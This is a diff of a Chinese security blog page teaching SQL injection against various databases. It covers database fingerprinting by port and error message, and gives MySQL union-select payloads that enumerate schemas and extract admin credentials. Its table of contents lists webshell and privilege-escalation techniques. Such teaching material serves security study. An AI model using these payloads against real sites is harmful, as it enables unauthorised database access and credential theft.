@@ -18,16 +18,16 @@
   
   
   <title>SQL注入进阶-各种数据库的注入方式 | J3fffff&#39;s Blog</title>
-  <meta name="description" content="介绍Access，Mysql，Mssql，mongoDB，postgresql，sqlite，oracle，sybase等 这些数据库除了Access没有数据库名外，其他都类似，有：数据库名+表名+列名+数据  什么决定网站注入点用户权限？数据库配置文件  如何识别各个数据库MYSQL  常见手法 找到注入点 and 1&#x3D;1 and 1&#x3D;2 测试报错  order by 5 # 到5的时候报错，获">
+  <meta name="description" content="介绍 什么决定网站注入点用户权限？数据库配置文件  常用数据库常见的数据库：Access，Mysql，Mssql，mongoDB，postgresql，sqlite，oracle，sybase等 这些数据库除了Access没有数据库名外，其他都类似，有：数据库名+表名+列名+数据 关系型数据库：通过外键关联来建立表与表之间的关系。由二维表及其之间的联系组成的一个数据组织。如：Oracle、DB2、">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入进阶-各种数据库的注入方式">
 <meta property="og:url" content="https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/index.html">
 <meta property="og:site_name" content="J3fffff&#39;s Blog">
-<meta property="og:description" content="介绍Access，Mysql，Mssql，mongoDB，postgresql，sqlite，oracle，sybase等 这些数据库除了Access没有数据库名外，其他都类似，有：数据库名+表名+列名+数据  什么决定网站注入点用户权限？数据库配置文件  如何识别各个数据库MYSQL  常见手法 找到注入点 and 1&#x3D;1 and 1&#x3D;2 测试报错  order by 5 # 到5的时候报错，获">
+<meta property="og:description" content="介绍 什么决定网站注入点用户权限？数据库配置文件  常用数据库常见的数据库：Access，Mysql，Mssql，mongoDB，postgresql，sqlite，oracle，sybase等 这些数据库除了Access没有数据库名外，其他都类似，有：数据库名+表名+列名+数据 关系型数据库：通过外键关联来建立表与表之间的关系。由二维表及其之间的联系组成的一个数据组织。如：Oracle、DB2、">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://j3f5.github.io/images/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/1621405493318-f8a180c6-8b51-4ff6-8ae6-30ab8b9de48a.png">
 <meta property="article:published_time" content="2023-05-23T10:24:39.000Z">
-<meta property="article:modified_time" content="2023-05-23T11:52:01.122Z">
+<meta property="article:modified_time" content="2023-05-24T06:20:33.400Z">
 <meta property="article:author" content="Jeff">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
@@ -52,7 +52,7 @@
 <meta name="generator" content="Hexo 6.3.0"></head>
 
 
-<body class="main-center theme-purple no-sidebar" itemscope itemtype="http://schema.org/WebPage">
+<body class="main-center theme-purple" itemscope itemtype="http://schema.org/WebPage">
   <header class="header" itemscope itemtype="http://schema.org/WPHeader">
   <div class="slimContent">
     <div class="navbar-header">
@@ -216,7 +216,7 @@
   <div class="widget">
     <h3 class="widget-title">归档</h3>
     <div class="widget-body">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a><span class="archive-list-count">3</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a><span class="archive-list-count">5</span></li></ul>
     </div>
   </div>
 
@@ -228,6 +228,56 @@
     <div class="widget-body">
       <ul class="recent-post-list list-unstyled ">
         
+          <li>
+            
+            <div class="item-thumb">
+              <a href="/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-WAF%E7%BB%95%E8%BF%87%E4%B8%8ESQLMAP%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" class="thumb">
+    
+    
+        <span class="thumb-image thumb-none"></span>
+    
+</a>
+
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-WAF%E7%BB%95%E8%BF%87%E4%B8%8ESQLMAP%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" class="title">SQL注入进阶-WAF绕过与SQLMAP工具的使用</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-05-24T06:46:22.000Z" itemprop="datePublished">2023-05-24</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-thumb">
+              <a href="/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%A0%86%E5%8F%A0%E3%80%81%E4%BA%8C%E6%AC%A1%E3%80%81DNS%E6%B3%A8%E5%85%A5%E3%80%81%E5%90%84%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5%E7%AD%89/" class="thumb">
+    
+    
+        <span class="thumb-image thumb-none"></span>
+    
+</a>
+
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%A0%86%E5%8F%A0%E3%80%81%E4%BA%8C%E6%AC%A1%E3%80%81DNS%E6%B3%A8%E5%85%A5%E3%80%81%E5%90%84%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5%E7%AD%89/" class="title">SQL注入进阶-堆叠、二次、DNS注入、各位置注入等</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-05-24T06:22:40.000Z" itemprop="datePublished">2023-05-24</time>
+              </p>
+            </div>
+          </li>
+          
           <li>
             
             <div class="item-thumb">
@@ -318,7 +368,7 @@
   <div class="slimContent">
     <nav id="toc" class="article-toc">
       <h3 class="toc-title">文章目录</h3>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E5%90%84%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.</span> <span class="toc-text">如何识别各个数据库</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MYSQL"><span class="toc-number">2.</span> <span class="toc-text">MYSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%89%8B%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">常见手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E5%BA%93%E6%9F%A5%E8%AF%A2%E4%BB%A5%E5%8F%8A%E5%BA%94%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">2.3.</span> <span class="toc-text">跨库查询以及应用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="toc-number">2.4.</span> <span class="toc-text">文件读写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-number">2.4.1.</span> <span class="toc-text">前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.4.2.</span> <span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA%EF%BC%88%E5%86%99%E5%85%A5%E5%88%B0%E6%96%87%E4%BB%B6%EF%BC%89"><span class="toc-number">2.4.3.</span> <span class="toc-text">文件导出（写入到文件）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E8%8E%B7%E5%8F%96%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95"><span class="toc-number">2.4.4.</span> <span class="toc-text">路径获取常见方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">2.5.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E5%BC%95%E5%8F%B7%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4"><span class="toc-number">2.6.</span> <span class="toc-text">魔术引号及常见保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">2.7.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF"><span class="toc-number">2.7.1.</span> <span class="toc-text">UDF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.7.2.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%8E%E7%89%88%E6%9C%AC%E6%B3%A8%E5%85%A5%E9%85%8D%E5%90%88%E8%AF%BB%E5%8F%96%E6%88%96%E6%9A%B4%E5%8A%9B-%E5%B0%8F%E4%BA%8E5-0%E7%89%88%E6%9C%AC"><span class="toc-number">2.8.</span> <span class="toc-text">低版本注入配合读取或暴力 小于5.0版本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACCESS"><span class="toc-number">3.</span> <span class="toc-text">ACCESS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSSQL"><span class="toc-number">4.</span> <span class="toc-text">MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">常用参数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLite"><span class="toc-number">5.</span> <span class="toc-text">SQLite</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MongoDB"><span class="toc-number">6.</span> <span class="toc-text">MongoDB</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DB2"><span class="toc-number">7.</span> <span class="toc-text">DB2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PostgreSQL"><span class="toc-number">8.</span> <span class="toc-text">PostgreSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sybase%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">9.</span> <span class="toc-text">Sybase数据库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Oracle"><span class="toc-number">10.</span> <span class="toc-text">Oracle</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">11.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8Ftips"><span class="toc-number">11.1.</span> <span class="toc-text">小tips</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#outfile-%E5%92%8C-dumpfile%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">11.1.1.</span> <span class="toc-text">outfile 和 dumpfile的区别</span></a></li></ol></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.</span> <span class="toc-text">常用数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">判断sql注入数据库类型方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MYSQL"><span class="toc-number">2.</span> <span class="toc-text">MYSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%89%8B%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">常见手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%88%E5%89%8D%E9%9D%A2%E6%8F%90%E8%BF%87%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">信息搜集（前面提过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E5%BA%93%E6%9F%A5%E8%AF%A2%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E4%BB%A5%E5%8F%8A%E5%BA%94%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">2.3.</span> <span class="toc-text">跨库查询、文件读写以及应用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E5%BA%93%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.3.1.</span> <span class="toc-text">跨库查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="toc-number">2.3.2.</span> <span class="toc-text">文件读写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">前提</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA%EF%BC%88%E5%86%99%E5%85%A5%E5%88%B0%E6%96%87%E4%BB%B6%EF%BC%89"><span class="toc-number">2.3.2.3.</span> <span class="toc-text">文件导出（写入到文件）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E8%8E%B7%E5%8F%96%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.2.4.</span> <span class="toc-text">路径获取常见方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E5%BC%95%E5%8F%B7%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4"><span class="toc-number">2.4.</span> <span class="toc-text">魔术引号及常见保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96"><span class="toc-number">2.5.</span> <span class="toc-text">权限获取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96"><span class="toc-number">2.5.1.</span> <span class="toc-text">数据库操作权限获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Webshell%E8%8E%B7%E5%8F%96"><span class="toc-number">2.5.2.</span> <span class="toc-text">Webshell获取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#into-outfile"><span class="toc-number">2.5.2.1.</span> <span class="toc-text">into outfile</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99-shell"><span class="toc-number">2.5.2.2.</span> <span class="toc-text">日志文件写 shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E6%8F%90%E6%9D%83%E3%80%90%E5%8F%82%E8%80%83%E5%9B%BD%E5%85%89%E3%80%91%EF%BC%89"><span class="toc-number">2.6.</span> <span class="toc-text">系统命令执行（提权【参考国光】）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2HASH%E8%A7%A3%E5%AF%86"><span class="toc-number">2.6.1.</span> <span class="toc-text">查询HASH解密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="toc-number">2.6.2.</span> <span class="toc-text">UDF提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83"><span class="toc-number">2.6.3.</span> <span class="toc-text">反弹端口提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MOF%E6%8F%90%E6%9D%83"><span class="toc-number">2.6.4.</span> <span class="toc-text">MOF提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-number">2.6.5.</span> <span class="toc-text">启动项提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2016-6663-x2F-6664%E7%BB%84%E5%90%88%E6%8B%B3"><span class="toc-number">2.6.6.</span> <span class="toc-text">CVE-2016-6663&#x2F;6664组合拳</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%8E%E7%89%88%E6%9C%AC%E6%B3%A8%E5%85%A5%E9%85%8D%E5%90%88%E8%AF%BB%E5%8F%96%E6%88%96%E6%9A%B4%E5%8A%9B-%E5%B0%8F%E4%BA%8E5-0%E7%89%88%E6%9C%AC"><span class="toc-number">2.7.</span> <span class="toc-text">低版本注入配合读取或暴力 小于5.0版本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACCESS"><span class="toc-number">3.</span> <span class="toc-text">ACCESS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSSQL"><span class="toc-number">4.</span> <span class="toc-text">MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">常用参数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLite"><span class="toc-number">5.</span> <span class="toc-text">SQLite</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MongoDB"><span class="toc-number">6.</span> <span class="toc-text">MongoDB</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DB2"><span class="toc-number">7.</span> <span class="toc-text">DB2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PostgreSQL"><span class="toc-number">8.</span> <span class="toc-text">PostgreSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sybase%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">9.</span> <span class="toc-text">Sybase数据库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Oracle"><span class="toc-number">10.</span> <span class="toc-text">Oracle</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">11.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8Ftips"><span class="toc-number">11.1.</span> <span class="toc-text">小tips</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#outfile-%E5%92%8C-dumpfile%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">11.1.1.</span> <span class="toc-text">outfile 和 dumpfile的区别</span></a></li></ol></li></ol></li></ol>
     </nav>
   </div>
 </aside>
@@ -365,12 +415,54 @@
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Access，Mysql，Mssql，mongoDB，postgresql，sqlite，oracle，sybase等</p>
-<p>这些数据库除了Access没有数据库名外，其他都类似，有：<strong>数据库名+表名+列名+数据</strong></p>
-<ul>
+        <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><ul>
 <li>什么决定网站注入点用户权限？<strong>数据库配置文件</strong></li>
 </ul>
-<h2 id="如何识别各个数据库"><a href="#如何识别各个数据库" class="headerlink" title="如何识别各个数据库"></a>如何识别各个数据库</h2><h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><img src="/images/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/1621405493318-f8a180c6-8b51-4ff6-8ae6-30ab8b9de48a.png" alt="MYSQL注入.png" style="zoom:80%;" />
+<h2 id="常用数据库"><a href="#常用数据库" class="headerlink" title="常用数据库"></a>常用数据库</h2><p>常见的数据库：Access，Mysql，Mssql，mongoDB，postgresql，sqlite，oracle，sybase等</p>
+<p>这些数据库除了Access没有数据库名外，其他都类似，有：<strong>数据库名+表名+列名+数据</strong></p>
+<p>关系型数据库：通过外键关联来建立表与表之间的关系。由二维表及其之间的联系组成的一个数据组织。如：Oracle、DB2、MySql</p>
+<p>非关系型数据库：通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。非关系型数据库产品是传统关系型数据库的功能阉割版本，通过减少用不到或很少用的功能，来大幅度提高产品性能。如：NoSql、Cloudant。</p>
+<h2 id="判断sql注入数据库类型方法"><a href="#判断sql注入数据库类型方法" class="headerlink" title="判断sql注入数据库类型方法"></a>判断sql注入数据库类型方法</h2><ol>
+<li><p>如果可以，直接通过<strong>端口&#x2F;默认语言</strong>判断</p>
+<ol>
+<li><p>默认语言搭配数据库：</p>
+<p>组合类型asp + access&#x2F;mssql<br>组合类型php + mysql<br>组合类型aspx+mssql<br>组合类型jsp +mysql&#x2F;oracle<br>组合类型Python + MongoDB</p>
+</li>
+<li><p>常见数据库的默认端口：</p>
+<ol>
+<li>关系型数据库<br>mysql 3306<br>sqlserver 1433<br>oracle 1521<br>psotgresql 5432</li>
+<li>非关系型数据库<br>MongoDB 27017<br>Redis 6379<br>memcached 11211</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>是否可以使用特定的函数来判断，该数据库特有的</p>
+<ol>
+<li>在mssql中可以调用<code>substring</code>。oracle则只可调用<code>substr</code></li>
+<li>mssql不可以调用<code>version()</code></li>
+</ol>
+</li>
+<li><p>是否可以使用辅助的符号来判断，如注释符号、多语句查询符等等</p>
+<ol>
+<li><code>/*</code>是MySQL中的注释符，返回错误说明该注入点不是MySQL；</li>
+<li><code>--</code>是Oracle和MSSQL都支持的，但是<code>;</code>是Oracle不支持的，因为它不支持多行查询。</li>
+</ol>
+</li>
+<li><p>是否可以编码查询</p>
+</li>
+<li><p>是否显可以利用错误信息</p>
+<blockquote>
+<p>例如：错误提示Microsoft JET Database Engine 错误 ‘80040e14’，说明是通过JET引擎连接数据库，则表明数据库为ACCESS数据库，如果是ODBC的话则说明是MSSQL数据库。</p>
+</blockquote>
+</li>
+<li><p>是否存在数据库某些特性辅助判断</p>
+<ol>
+<li>特殊表：access(msysobjects)，mssql(sysobjects)，oracle(sys.user_tables)，mysql(information_schema)</li>
+</ol>
+</li>
+</ol>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e308d96e2ecd">https://www.jianshu.com/p/e308d96e2ecd</a></p>
+<h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><img src="/images/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/1621405493318-f8a180c6-8b51-4ff6-8ae6-30ab8b9de48a.png" alt="MYSQL注入.png" style="zoom:80%;" />
 
 <h2 id="常见手法"><a href="#常见手法" class="headerlink" title="常见手法"></a>常见手法</h2><ol>
 <li><p>找到注入点 <code>and 1=1</code> <code>and 1=2 </code>测试报错</p>
@@ -390,17 +482,17 @@
 <li><p>脱库</p>
 </li>
 </ol>
-<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名）</p>
+<h2 id="信息搜集（前面提过）"><a href="#信息搜集（前面提过）" class="headerlink" title="信息搜集（前面提过）"></a>信息搜集（前面提过）</h2><p>在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，</span><br><span class="line">table_schema和table_name分别来存储数据库名和表名</span><br><span class="line">information_schema.tables 记录所有的表</span><br><span class="line">information_schema.columns 记录所有的列</span><br></pre></td></tr></table></figure>
 
 <p><strong>MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行getshell操作，其中也会遇到很多的阻碍，相关防御手法也要明确，所谓知己知彼，百战不殆。作为安全开发工作者，攻防兼备。</strong></p>
 <p>注入点权限是否为root，取决于连接数据库的文件。这也决定了高权限注入及低权限注入。使用<code>user()</code>进行查看，而且需要注意的是：<em>不是root权限获取不到数据库名。</em></p>
-<h2 id="跨库查询以及应用思路"><a href="#跨库查询以及应用思路" class="headerlink" title="跨库查询以及应用思路"></a>跨库查询以及应用思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 获取所有数据库名</span><br><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata </span><br><span class="line"></span><br><span class="line"># 查表，找与网站对应的数据库名，若没有，则挨个查。或者使用 union select 1,2,database()</span><br><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &#x27;qqyw&#x27;</span><br><span class="line"></span><br><span class="line"># 跨库查列</span><br><span class="line">?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &#x27;admin&#x27; and table_schema=&#x27;qqyw&#x27;</span><br><span class="line"></span><br><span class="line"># 查结果</span><br><span class="line">?id=-1 union select 1,u,p from qqyw.admin</span><br></pre></td></tr></table></figure>
+<h2 id="跨库查询、文件读写以及应用思路"><a href="#跨库查询、文件读写以及应用思路" class="headerlink" title="跨库查询、文件读写以及应用思路"></a>跨库查询、文件读写以及应用思路</h2><h3 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 获取所有数据库名</span><br><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata </span><br><span class="line"></span><br><span class="line"># 查表，找与网站对应的数据库名，若没有，则挨个查。或者使用 union select 1,2,database()</span><br><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &#x27;qqyw&#x27;</span><br><span class="line"></span><br><span class="line"># 跨库查列</span><br><span class="line">?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &#x27;admin&#x27; and table_schema=&#x27;qqyw&#x27;</span><br><span class="line"></span><br><span class="line"># 查结果</span><br><span class="line">?id=-1 union select 1,u,p from qqyw.admin</span><br></pre></td></tr></table></figure>
 
-<h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>会用到MySQL数据库里两个内置函数，这两个函数是MySQL数据库特有的，在其他数据库是没有的或者在其他数据库中写法不同，所以这是为什么说注入点分数据库的原因，因为每个数据库内置的安全机制和它的功能不同，这才导致在注入的时候针对不用的数据库采取的攻击思路也不同。MySQL有内置读取的操作函数，我们可以调用这个函数作为注入的攻击。</p>
+<h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><p>会用到MySQL数据库里两个内置函数，这两个函数是MySQL数据库特有的，在其他数据库是没有的或者在其他数据库中写法不同，所以这是为什么说注入点分数据库的原因，因为每个数据库内置的安全机制和它的功能不同，这才导致在注入的时候针对不用的数据库采取的攻击思路也不同。MySQL有内置读取的操作函数，我们可以调用这个函数作为注入的攻击。</p>
 <p><strong>读取函数</strong>：<code>load_file()</code></p>
